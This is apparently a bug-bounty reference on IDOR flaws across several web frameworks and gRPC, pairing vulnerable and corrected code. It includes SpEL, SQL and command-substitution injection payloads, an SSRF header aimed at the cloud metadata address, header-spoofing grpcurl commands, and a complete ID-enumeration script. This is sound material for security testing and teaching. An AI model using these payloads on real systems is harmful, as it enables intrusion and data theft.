# Framework-Specific IDOR Patterns

The highest-value IDOR bugs aren't found by trying random IDs — they're found by understanding
how the *specific framework* the target uses handles authorization, and where that framework
has characteristic failure modes. This reference gives you exactly that.

---

## Rails (Ruby on Rails)

### How Rails Authorization Typically Works

Most Rails apps use one of three authorization gems: `Pundit`, `CanCanCan`, or manual `before_action` checks.
Each has a characteristic failure mode.

### Pundit Failure Mode — Missing Policy

Pundit requires the developer to call `authorize` in every controller action. It's easy to forget.

```ruby
# CORRECT — authorization checked
def show
  @document = Document.find(params[:id])
  authorize @document  # ← this line is required
  render json: @document
end

# VULNERABLE — forgot to call authorize
def show
  @document = Document.find(params[:id])
  render json: @document  # ← any authenticated user can access any document
end
```

**How to detect Pundit:** Look for `Pundit::NotAuthorizedError` in error responses.
Check if adding `?debug=true` or triggering an error reveals Pundit in the stack trace.

**What to probe:** Every action that returns a resource. Try changing the resource ID.
Focus on less-trafficked actions: `edit`, `update`, `destroy`, `download`, `export`, `share`.

**Pundit `policy_scope` bypass:**
```ruby
# Even if authorize is present, if the developer uses policy_scope incorrectly:
def index
  @documents = policy_scope(Document)  # scoped correctly
  render json: @documents
end

# But if they mix scoped and unscoped:
def search
  @documents = Document.where("title LIKE ?", "%#{params[:q]}%")  # unscoped!
  render json: @documents
end
# → search endpoint returns all users' documents
```

### CanCanCan Failure Mode — Load and Authorize Mismatch

```ruby
# CORRECT
load_and_authorize_resource  # ← auto-loads AND authorizes

# VULNERABLE pattern — load without authorize
before_action :set_document
# ...but no authorize call
def set_document
  @document = Document.find(params[:id])
end
```

**What to look for:** Actions that don't inherit from a controller with `load_and_authorize_resource`.
API controllers often have lighter authorization than web controllers.

### Strong Parameters IDOR (Mass Assignment)

Rails strong_parameters controls what the user can write, not what they can read. But
misconfigured `permit` can allow writing to foreign keys:

```ruby
# VULNERABLE — user can change document owner
def document_params
  params.require(:document).permit(:title, :content, :user_id)
  #                                                    ^^^^^^^^^ never permit this
end

# Attack: PATCH /api/documents/123 with {"user_id": "admin_user_id"}
# → assigns document to admin user
# → admin user now sees your document in their account
# → you've effectively escalated to admin's namespace
```

**Automated test:** For every POST/PUT/PATCH endpoint, try adding `user_id`, `owner_id`,
`account_id`, `organization_id` to the request body.

---

## Django (Python)

### Django REST Framework — Missing `get_object` Override

DRF's `RetrieveAPIView` calls `get_object()` which calls `check_object_permissions`. But
the base `get_queryset()` often returns all objects:

```python
# VULNERABLE — queryset isn't filtered by user
class DocumentView(RetrieveAPIView):
    queryset = Document.objects.all()  # ← returns all documents
    serializer_class = DocumentSerializer
    permission_classes = [IsAuthenticated]

# Attack: GET /api/documents/OTHER_USER_ID → returns other user's document
# The IsAuthenticated check only verifies you're logged in, not that it's YOUR document
```

**CORRECT implementation:**
```python
class DocumentView(RetrieveAPIView):
    def get_queryset(self):
        return Document.objects.filter(user=self.request.user)  # ← scoped
```

**What to probe:** Every DRF view. Filter by scope — if the app has hundreds of endpoints,
prioritize ones that return sensitive data.

### Django `permission_classes` on Views vs Viewsets

```python
# Global default in settings.py
REST_FRAMEWORK = {
    'DEFAULT_PERMISSION_CLASSES': ['rest_framework.permissions.IsAuthenticated']
}

# But individual views can override with empty list:
class PublicDocumentView(ListAPIView):
    permission_classes = []  # ← public endpoint
    queryset = Document.objects.all()  # Returns ALL documents with no auth
```

**What to probe:** Endpoints that respond to unauthenticated requests. Tools like
Autorize or manually sending requests without `Authorization` header.

### Django Admin IDOR

```python
# Custom admin views often skip Django's built-in auth checks
@staff_member_required
def admin_export(request):
    user_id = request.GET.get('user_id')  # ← no check that staff can access this user
    user_data = User.objects.get(id=user_id).export()
    return JsonResponse(user_data)

# Attack: if you have any staff access, try enumerating other staff/admin accounts
```

---

## Spring Boot (Java)

### Spring Security — Missing Method-Level Security

Spring Security can enforce auth at the request level (URL patterns) OR the method level
(`@PreAuthorize`). Apps that rely only on URL patterns are vulnerable at the service layer.

```java
// VULNERABLE — security only at URL level, no object-level check
@RestController
public class DocumentController {

    @GetMapping("/api/documents/{id}")
    public Document getDocument(@PathVariable Long id) {
        return documentService.findById(id);  // ← no ownership check
    }
}

// The SecurityConfig has:
// .antMatchers("/api/documents/**").authenticated()
// → Any authenticated user can access any document
```

**What to probe:** Authenticated endpoints with ID parameters. Spring apps often have
thorough URL-level auth but skip object-level auth entirely.

### Spring Data — Repository Method Injection

Spring Data repositories auto-generate queries from method names. A custom query that
uses SpEL (Spring Expression Language) can be vulnerable:

```java
// VULNERABLE — uses user input in SpEL expression
@Query("SELECT d FROM Document d WHERE d.title = :#{#title}")
List<Document> findByTitle(@Param("title") String title);

// SpEL injection test:
// title = #{T(java.lang.Runtime).getRuntime().exec('id')}
// (rare but found in prod)
```

### @PreAuthorize — Common Misconfiguration

```java
// VULNERABLE — checks role but not ownership
@PreAuthorize("hasRole('USER')")
@GetMapping("/api/documents/{id}")
public Document getDocument(@PathVariable Long id) {
    return documentService.findById(id);  // ← any USER can access any document
}

// CORRECT
@PreAuthorize("@documentSecurity.isOwner(#id, principal)")
@GetMapping("/api/documents/{id}")
public Document getDocument(@PathVariable Long id) {
    return documentService.findById(id);
}
```

**Pattern to look for:** `@PreAuthorize` that checks only role, not ownership.

---

## Express / Node.js

### Mongoose — Missing User Filter

```javascript
// VULNERABLE
app.get('/api/documents/:id', authMiddleware, async (req, res) => {
    const doc = await Document.findById(req.params.id);  // finds any document
    res.json(doc);
});

// CORRECT
app.get('/api/documents/:id', authMiddleware, async (req, res) => {
    const doc = await Document.findOne({
        _id: req.params.id,
        userId: req.user.id  // ← must also match current user
    });
    if (!doc) return res.status(403).json({ error: 'Forbidden' });
    res.json(doc);
});
```

**Pattern:** Every `findById` call. The correct version uses `findOne` with both ID and
owner filter. Search the codebase for `findById` and check each one.

### JWT Payload Trust

Express apps using JWT often extract claims and use them directly without server-side validation:

```javascript
// VULNERABLE — trusts JWT payload values without DB lookup
app.get('/api/admin/users', authMiddleware, (req, res) => {
    if (req.user.role === 'admin') {  // ← from JWT payload, can be forged!
        return User.find({}, res.json.bind(res));
    }
    res.status(403).json({ error: 'Forbidden' });
});
```

Chain with `oauth-auth-deep` — if you can forge a JWT with `role: admin`, you get admin access.

---

## FastAPI (Python)

### Depends() — Missing User Scope

FastAPI uses dependency injection for auth. A common mistake: validating the token but
not filtering resources by the authenticated user.

```python
# VULNERABLE
@app.get("/documents/{document_id}")
async def get_document(
    document_id: int,
    current_user: User = Depends(get_current_user),  # validates auth
    db: Session = Depends(get_db)
):
    document = db.query(Document).filter(Document.id == document_id).first()
    # ← no filter on Document.user_id == current_user.id
    return document

# CORRECT
document = db.query(Document).filter(
    Document.id == document_id,
    Document.user_id == current_user.id  # ← must match
).first()
```

**What to probe:** Every FastAPI endpoint with an ID path parameter. The auth dependency
validates the JWT but doesn't automatically scope database queries.

---

## Cryptographic IDOR — When IDs Look Random but Aren't

Some apps replace sequential IDs with "random-looking" tokens that are actually predictable.
This section covers how to detect and exploit weak ID generation.

### ULID Detection and Prediction

ULIDs (Universally Unique Lexicographically Sortable Identifiers) contain a millisecond
timestamp in the first 10 characters:

```
01ARZ3NDEKTSV4RRFFQ69G5FAV
^^^^^^^^^^ ^^^^^^^^^^^^^^^^
timestamp   randomness (80 bits)
```

If the server uses a **seeded** random number generator or low-entropy randomness:
```python
# Detect: collect 10 ULIDs for resources created at known times
# Check if the timestamp portion matches creation time
# If yes → timestamp is real → narrow the time window for brute force

# For 80-bit randomness: genuine ULIDs are not practically brutable
# But: some implementations use 32-bit seeded PRNG → brutable

# Test: create 2 resources in rapid succession
# If randomness bytes are sequential or obviously related → weak PRNG
```

### UUID Version Detection

```python
import uuid

u = uuid.UUID("550e8400-e29b-41d4-a716-446655440000")
print(u.version)  # → 4 (random), 1 (timestamp-based), 3/5 (namespace+name hash)

# UUID v1: contains MAC address + timestamp → guessable
# UUID v4: cryptographically random if implemented correctly
# UUID v3/v5: hash of namespace + name → if namespace is known, enumerable by testing names
```

**Attack on UUID v1:**
```python
from uuid import UUID
import datetime

# UUID v1 has 100ns timestamp since Oct 15, 1582
u = UUID("110e8400-e29b-11d4-a716-446655440000")
ts_100ns = u.time  # 100ns intervals since 1582
epoch_1582 = datetime.datetime(1582, 10, 15)
ts = epoch_1582 + datetime.timedelta(microseconds=ts_100ns/10)
print(f"UUID v1 created at: {ts}")

# If you know approximate creation time → narrow timestamp → enumerate nearby UUIDs
```

### Hashid / Obfuscated Integer IDs

Many apps use libraries like `hashids` to obfuscate integer IDs:
```
/api/documents/Y6GdD → actually document ID 1234567
```

```python
from hashids import Hashids
# Common: default salt = "", min_length = 0, alphabet = default
h = Hashids()
print(h.decode("Y6GdD"))  # → (1234567,) if default settings

# Try common salts: "", "hashids", app name, domain name
# Or: find the salt in leaked source code / JS bundle
salts_to_try = ["", "hashids", "app_name", "secret", "yoursalt"]
for salt in salts_to_try:
    h = Hashids(salt=salt)
    decoded = h.decode("Y6GdD")
    if decoded:
        print(f"Salt '{salt}' → decoded: {decoded}")
        break
```

---

## gRPC-Specific IDOR Patterns

### Discovery and Enumeration

```bash
# List services via reflection (if enabled — common in dev/staging)
grpcurl -plaintext target.com:50051 list

# List methods in a service
grpcurl -plaintext target.com:50051 list com.example.DocumentService

# Describe a method schema
grpcurl -plaintext target.com:50051 describe com.example.DocumentService.GetDocument

# Invoke a method with field substitution
grpcurl -plaintext -d '{"document_id": "OTHER_USER_DOC_ID"}' \
  target.com:50051 com.example.DocumentService/GetDocument

# gRPC Web (via HTTP/2 or HTTP/1.1 with base64):
# Proxy through Burp using grpc-web plugin
```

### gRPC IDOR Patterns

gRPC services are vulnerable to the same IDOR logic bugs as REST — the transport is
different, but authorization checks are applied at the handler level in the same ways.

**Common field names that indicate IDOR potential:**
```protobuf
// These fields, when changed to another user's value, often return that user's data
message GetDocumentRequest {
  string document_id = 1;    // ← primary IDOR target
  string user_id = 2;        // ← horizontal IDOR
  string owner_id = 3;       // ← ownership claim
  string resource_name = 4;  // ← may be path-like, try traversal
}
```

**gRPC metadata injection:**
```bash
# gRPC metadata = HTTP/2 headers
# Some services use metadata for auth bypass or user spoofing
grpcurl -plaintext \
  -H "x-user-id: ADMIN_USER_ID" \
  -H "x-impersonate: true" \
  -d '{"document_id": "123"}' \
  target.com:50051 com.example.DocumentService/GetDocument
```

**gRPC streaming IDOR:**
```bash
# Server streaming: subscribe to a stream with another user's resource ID
grpcurl -plaintext -d '{"user_id": "OTHER_USER_ID"}' \
  target.com:50051 com.example.NotificationService/SubscribeToUpdates

# Bidirectional streaming: inject a different user's ID mid-stream
```

### gRPC Metadata Injection

gRPC metadata = HTTP/2 headers. Services sometimes use metadata for auth or context — and
may pass them into downstream queries without sanitization:

```bash
# Header spoofing / privilege escalation
grpcurl -plaintext \
  -H "x-user-id: ADMIN_USER_ID" \
  -H "x-user-role: admin" \
  -H "x-impersonate: true" \
  -d '{"document_id": "123"}' \
  target.com:50051 com.example.DocumentService/GetDocument

# SQL injection via metadata (found in prod — service passes header into raw query)
grpcurl -plaintext \
  -H "x-user-role: admin' OR '1'='1" \
  -d '{}' \
  target.com:50051 com.example.UserService/ListUsers

# Log injection / SSRF via trace header
grpcurl -plaintext \
  -H "x-trace-id: $(whoami)" \
  -H "x-forwarded-for: 169.254.169.254" \
  -d '{}' \
  target.com:50051 com.example.Service/Method
```

### Protobuf Boundary Values

Proto field types don't guarantee server validation. Test with values that overflow or
underflow the expected type:

```bash
# int64 MAX — may cause int overflow in downstream integer arithmetic
grpcurl -plaintext -d '{"document_id": 9223372036854775807}' \
  target.com:50051 com.example.DocumentService/GetDocument

# Negative IDs — may return different user's record if stored as unsigned
grpcurl -plaintext -d '{"document_id": -1}' \
  target.com:50051 com.example.DocumentService/GetDocument

# Zero — often maps to admin/system records
grpcurl -plaintext -d '{"document_id": 0}' \
  target.com:50051 com.example.DocumentService/GetDocument

# Decode captured binary protobuf traffic manually
cat request.bin | protoc --decode=myapp.GetDocumentRequest document.proto
```

### Traffic Interception for gRPC

```bash
# mitmproxy — best for HTTP/2 gRPC interception
mitmproxy -p 8080 --mode http2
export GRPC_PROXY=http://localhost:8080
grpcurl -insecure -proxy http://localhost:8080 target.com:443 list

# Burp Suite — requires gRPC Web Developer Tools extension (BApp Store)
# Works best when you provide the .proto file for automatic decoding
```

### Tools for gRPC Testing

```bash
# grpcurl — command line gRPC client (primary tool)
# https://github.com/fullstorydev/grpcurl
brew install grpcurl  # macOS
choco install grpcurl  # Windows

# grpcui — browser UI for gRPC testing (recommended for manual IDOR)
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
grpcui -plaintext target.com:50051

# ghz — systematic load testing and method enumeration
# https://github.com/bojand/ghz
ghz --insecure --proto ./user.proto \
  --call myapp.UserService.GetUser \
  -m '{"user_id": 1}' \
  target.com:50051

# Postman — supports gRPC natively with .proto import
# Burp Suite gRPC extension (BApp Store) — for HTTP/1.1 gRPC-Web

# If reflection disabled: extract .proto files from:
# - GitHub repos (search org on GitHub)
# - APK/IPA (mobile apps bundle .proto files — use apktool/frida)
# - JS bundles (proto-loader includes schema — search for "syntax = \"proto")
# - Debug endpoints: /api/grpc-schema, /debug/protobuf, /_/health
```

---

## IDOR Automation Script

For numeric IDs, automate the enumeration rather than testing manually:

```python
#!/usr/bin/env python3
"""
idor_enum.py — Enumerate IDs against an API endpoint

Usage:
  python3 idor_enum.py --url "https://api.target.com/documents/{id}" \
    --auth "Bearer YOUR_TOKEN" \
    --start 1 --end 10000 \
    --your-id 4521 \
    --out results.json
"""
import argparse
import json
import time
import requests
from typing import Optional

def test_id(
    session: requests.Session,
    url_template: str,
    id_val: int,
    your_id: Optional[int],
    delay: float,
) -> Optional[dict]:
    url = url_template.replace("{id}", str(id_val))
    try:
        r = session.get(url, timeout=10)
        time.sleep(delay)
        if r.status_code == 200:
            # Don't record your own data
            if id_val == your_id:
                return None
            return {"id": id_val, "status": r.status_code, "size": len(r.content), "url": url}
        return None
    except requests.RequestException:
        return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="URL template with {id} placeholder")
    parser.add_argument("--auth", required=True, help="Authorization header value")
    parser.add_argument("--start", type=int, default=1)
    parser.add_argument("--end", type=int, default=1000)
    parser.add_argument("--your-id", type=int, help="Your own resource ID (to skip)")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests (seconds)")
    parser.add_argument("--out", default="idor_results.json")
    args = parser.parse_args()

    session = requests.Session()
    session.headers["Authorization"] = args.auth

    hits = []
    print(f"[*] Testing IDs {args.start}–{args.end} against {args.url}")
    print(f"[*] Delay: {args.delay}s | Output: {args.out}")

    for i in range(args.start, args.end + 1):
        result = test_id(session, args.url, i, args.your_id, args.delay)
        if result:
            print(f"  [HIT] ID={i} | {result['size']} bytes")
            hits.append(result)

        if i % 100 == 0:
            print(f"  [{i}/{args.end}] {len(hits)} hits so far")

    with open(args.out, "w") as f:
        json.dump(hits, f, indent=2)

    print(f"\n[*] Complete. {len(hits)} hits. Saved to {args.out}")
    print(f"[!] Do NOT include all records in your report.")
    print(f"[!] Report: 'Found {len(hits)} accessible records across tested range'")
    print(f"[!] Then check total count from pagination → calculate full exposure scale")

if __name__ == "__main__":
    main()
```
